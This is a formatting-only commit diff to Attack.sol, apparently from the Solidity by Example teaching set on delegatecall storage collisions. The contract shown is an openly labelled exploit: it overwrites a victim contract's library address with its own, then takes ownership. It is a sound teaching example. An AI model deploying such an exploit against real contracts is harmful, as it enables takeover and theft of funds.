Standardize formatting in files

+++ src/storage_collision/SolidityByExample/Attack.sol
@@ -8,7 +8,7 @@ contract Attack {
     // This will allow us to correctly update the state variables
     address public lib;
     address public owner;
-    uint public someNumber;
+    uint256 public someNumber;
 
     HackMe public hackMe;
 
@@ -18,14 +18,16 @@ contract Attack {
 
     function attack() public {
         // override address of lib
-        hackMe.doSomething(uint(uint160(address(this))));
+        hackMe.doSomething(uint256(uint160(address(this))));
         // pass any number as input, the function doSomething() below will
         // be called
         hackMe.doSomething(1);
     }
 
     // function signature must match HackMe.doSomething()
-    function doSomething(uint /* _num */) public {
+    function doSomething(
+        uint256 /* _num */
+    ) public {
         owner = msg.sender;
     }
 }
